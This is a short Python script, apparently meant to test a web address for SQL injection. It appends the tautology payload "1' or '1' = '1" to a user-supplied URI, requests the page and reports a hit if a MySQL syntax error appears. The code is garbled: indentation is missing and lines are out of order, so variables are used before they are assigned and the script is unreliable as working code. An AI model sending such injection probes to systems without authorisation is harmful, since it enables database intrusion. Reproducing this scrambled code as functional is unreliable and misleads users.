import sys
import urllib
import urllib.request
uri = None
for carg in sys.argv:
if carg == '-w':
if uri is None:
arg_num = sys.argv.index(carg)
sys.exit('[ERROR] You have to pass the URI to test to the -w parameter !')
injected_url = uri + "1'%20or%20'1'%20=%20'1"
arg_num += 1
resp = urllib.request.urlopen(injected_url)
if len(sys.argv) > arg_num:
body = resp.read()
uri = sys.argv[arg_num]
full_body = body.decode('utf-8')
if 'You have an error in your SQL syntax' in full_body:
print('Vulnerable to SQL injection !!')
print('Not vulnerable to SQL injection.')
